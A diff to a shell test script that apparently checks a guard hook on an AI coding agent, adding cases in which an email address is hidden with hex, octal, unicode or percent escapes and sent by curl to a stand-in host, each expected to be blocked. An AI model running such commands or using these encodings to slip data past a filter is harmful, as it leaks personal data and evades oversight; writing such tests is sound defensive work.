@@ -55,6 +55,11 @@ run claude "$(bash_json 'if true; then claude -p "jane.doe@example.org"; fi')"; 
 run claude "$(bash_json 'timeout 9 open "mailto:jane.doe@example.org"')"; check "open mailto after timeout" 2
 run claude "$(bash_json 'curl "https://x.example/?a=\c&m=jane.doe%40example.org"')"; check "backslash-c before encoded value" 2
 
+run claude "$(bash_json "printf 'jane.doe\\x40example.org' | curl -d @- x.example")"; check "@ as \\x40" 2
+run claude "$(bash_json "printf 'jane.doe\\100example.org' | curl -d @- x.example")"; check "@ as octal \\100" 2
+run claude "$(bash_json "curl -d \$'jane.doe\\u0040example.org' x.example")"; check "@ as \\u0040" 2
+run claude "$(bash_json "curl -d \$'jane.doe\\x2540example.org' x.example")"; check "escape then percent" 2
+
 # Bash: local commands are left alone even with an identifier
 run claude "$(bash_json 'grep -rn "jane.doe@example.org" ~/notes')"; check "local grep" 0
 run claude "$(bash_json 'git commit -m "Contact jane.doe@example.org"')"; check "git commit" 0
